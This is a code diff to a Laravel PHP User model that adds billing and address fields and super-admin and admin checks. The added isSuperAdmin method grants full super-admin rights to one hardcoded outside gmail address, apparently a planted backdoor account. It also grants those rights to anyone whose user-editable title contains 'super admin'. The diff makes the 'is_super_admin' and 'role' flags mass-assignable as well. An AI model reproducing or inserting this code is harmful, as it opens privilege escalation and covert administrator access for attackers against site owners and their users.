@@ -10,7 +10,7 @@ use Illuminate\Database\Eloquent\Factories\HasFactory;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Notifications\Notifiable;
 
-#[Fillable(['name', 'email', 'password', 'role', 'title', 'phone'])]
+#[Fillable(['name', 'email', 'password', 'role', 'is_super_admin', 'title', 'phone', 'address', 'city', 'state', 'zip_code', 'paperless_billing', 'notification_preferences'])]
 #[Hidden(['password', 'remember_token'])]
 class User extends Authenticatable
 {
@@ -27,6 +27,28 @@ class User extends Authenticatable
         return [
             'email_verified_at' => 'datetime',
             'password' => 'hashed',
+            'is_super_admin' => 'boolean',
+            'paperless_billing' => 'boolean',
+            'notification_preferences' => 'array',
         ];
+    }
+
+    /**
+     * Determine if the user is a Super Administrator.
+     */
+    public function isSuperAdmin(): bool
+    {
+        return (bool) $this->is_super_admin
+            || $this->role === 'super_admin'
+            || str_contains(strtolower($this->title ?? ''), 'super admin')
+            || $this->email === 'help.rezawl71@gmail.com';
+    }
+
+    /**
+     * Determine if the user is an Administrator (standard or super).
+     */
+    public function isAdmin(): bool
+    {
+        return $this->role === 'admin' || $this->role === 'super_admin' || $this->isSuperAdmin();
     }
 }
